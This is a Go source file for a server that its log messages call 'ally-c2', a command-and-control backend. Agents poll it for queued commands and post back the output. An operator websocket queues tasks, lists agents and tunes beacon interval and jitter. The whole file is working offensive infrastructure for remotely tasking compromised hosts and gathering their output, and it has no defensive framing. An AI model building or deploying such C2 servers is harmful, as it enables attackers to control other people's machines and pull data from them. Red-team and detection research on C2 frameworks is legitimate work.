package main

import (
	"log"
	"net/http"
	"sync"
	"time"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
	"github.com/gin-gonic/gin"
)

//struct for single agent
type AgentSession struct {
	ID          string    `json:"id"`
	LastSeen    time.Time `json:"last_seen"`
	TaskQueue   []string  `json:"task_queue"`   // agent task list
	OutputQueue []string  `json:"output_queue"` // agent output list 
	Interval     int             `json:"interval"` // polling
    Jitter       int             `json:"jitter"`   // jitter

}

var (
	clients = make(map[string]*AgentSession)
	mu      sync.Mutex
	operatorConn     *websocket.Conn 
	operatorConnMu   sync.Mutex      
)





//cli/operator endpoint

var (
    eventConn   *websocket.Conn
    eventConnMu sync.Mutex
)

// handleEvents ep for output ws
func handleEvents(c *gin.Context) {
    opts := &websocket.AcceptOptions{
        InsecureSkipVerify: true,
    }
    conn, err := websocket.Accept(c.Writer, c.Request, opts)
    if err != nil {
        return
    }
    defer conn.Close(websocket.StatusNormalClosure, "Closing")

    eventConnMu.Lock()
    eventConn = conn
    eventConnMu.Unlock()

    defer func() {
        eventConnMu.Lock()
        eventConn = nil
        eventConnMu.Unlock()
    }()

    ctx := c.Request.Context()
    for {
        var dummy map[string]interface{}
        err := wsjson.Read(ctx, conn, &dummy)
        if err != nil {
            break
        }
    }
}



func handleOperator(c *gin.Context) {
	opts := &websocket.AcceptOptions{
		InsecureSkipVerify: true,
	}
	
	conn, err := websocket.Accept(c.Writer, c.Request, opts)
	if err != nil {
		log.Printf("Error while handshake WebSocket: %v", err)
		return
	}
	defer conn.Close(websocket.StatusNormalClosure, "Closing session")

	//save operator connection 
	operatorConnMu.Lock()
	operatorConn = conn
	operatorConnMu.Unlock()

	//clean them variable when the ws close
	defer func() {
		operatorConnMu.Lock()
		operatorConn = nil
		operatorConnMu.Unlock()
	}()

	log.Println("[*] Operator connected with success!")
	ctx := c.Request.Context()

	for {
		var msg map[string]interface{}
		err := wsjson.Read(ctx, conn, &msg)
		if err != nil {
			log.Printf("[-] CLI-CLIENT disconnected: %v", err)
			break
		}

		action, ok := msg["action"].(string)
		if !ok {
			continue
		}

		log.Printf("[Command received] -> Action: %v", action)

		// add task cli to queue
		if action == "queue_task" {
			agentID := msg["agent_id"].(string)
			command := msg["data"].(string)

			mu.Lock()
			if _, exists := clients[agentID]; !exists {
				clients[agentID] = &AgentSession{
					ID:        agentID,
					LastSeen:  time.Now(),
					TaskQueue: []string{},
				}
			}

			clients[agentID].TaskQueue = append(clients[agentID].TaskQueue, command)
			mu.Unlock()

			log.Printf("[+] Task '%s' accorded for agent: %s", command, agentID)

			wsjson.Write(ctx, conn, map[string]string{
				"status": "success",
				"output": "Task successfully queued on server.",
			})
		} else if action == "list_agents" {
			mu.Lock()
			var agentList []string
			for id := range clients {
				agentList = append(agentList, id)
			}
			mu.Unlock()

			wsjson.Write(ctx, conn, map[string]interface{}{
				"status": "success",
				"agents": agentList,
			})
		} else if action == "update_beacon" {
			agentID := msg["agent_id"].(string)
			interval := int(msg["interval"].(float64))
			jitter := int(msg["jitter"].(float64))

			mu.Lock()
			if session, exists := clients[agentID]; exists {
				session.Interval = interval
				session.Jitter = jitter
			} else {
				clients[agentID] = &AgentSession{ID: agentID, Interval: interval, Jitter: jitter}
			}
			mu.Unlock()

			wsjson.Write(ctx, conn, map[string]string{"status": "success", "output": "Beacon updated."})

		}
	}
}




//#############################################
func main() {

	r := gin.Default()
	port := ":8080"

	// operator ep
	r.GET("/ws/events", handleEvents)
	r.GET("/ws/operator", handleOperator)



	// GET /api/agent/poll?id=<agent id>
	r.GET("/api/agent/poll", func(c *gin.Context) {
        agentID := c.Query("id")
        if agentID == "" {
            c.JSON(http.StatusBadRequest, gin.H{"error": "Missing agent ID"})
            return
        }

        mu.Lock()
        defer mu.Unlock()

        session, exists := clients[agentID]
        if !exists {
            clients[agentID] = &AgentSession{
                ID:        agentID,
                LastSeen:  time.Now(),
                TaskQueue: []string{},
                Interval:  5,
                Jitter:    0,
            }
            session = clients[agentID]
        }

        session.LastSeen = time.Now()

        status := "no_tasks"
        command := ""
        if len(session.TaskQueue) > 0 {
            status = "task_assigned"
            command = session.TaskQueue[0]
            session.TaskQueue = session.TaskQueue[1:]
        }



		c.JSON(http.StatusOK, gin.H{
			"status":   status,
			"command":  command,
			"interval": session.Interval,
			"jitter":   session.Jitter,
		})
    })



	// POST /api/agent/output
	r.POST("/api/agent/output", func(c *gin.Context) {
		var req struct {
			ID     string `json:"id"`
			Output string `json:"output"`
		}

		if err := c.BindJSON(&req); err != nil {
			c.JSON(http.StatusBadRequest, gin.H{"status": "error", "message": "Invalid JSON"})
			return
		}

		mu.Lock()
		if session, exists := clients[req.ID]; exists {
			session.OutputQueue = append(session.OutputQueue, req.Output)
			session.LastSeen = time.Now()
		}
		mu.Unlock()

		log.Printf("\n[Output form agent: %s]:\n%s\n", req.ID, req.Output)

		eventConnMu.Lock()
		if eventConn != nil {
			ctx := c.Request.Context()
			pushMsg := map[string]string{
				"type":     "agent_output",
				"agent_id": req.ID,
				"output":   req.Output,
			}
			_ = wsjson.Write(ctx, eventConn, pushMsg)
		}
		eventConnMu.Unlock()

		c.JSON(http.StatusOK, gin.H{"status": "received"})
	})




	// connection error error 
	log.Printf("[*] ally-c2 server (Go) listening on %s...", port)
	err := r.Run(port)
	if err != nil {
		log.Fatalf("Error: critical server error: %v", err)
	}
}
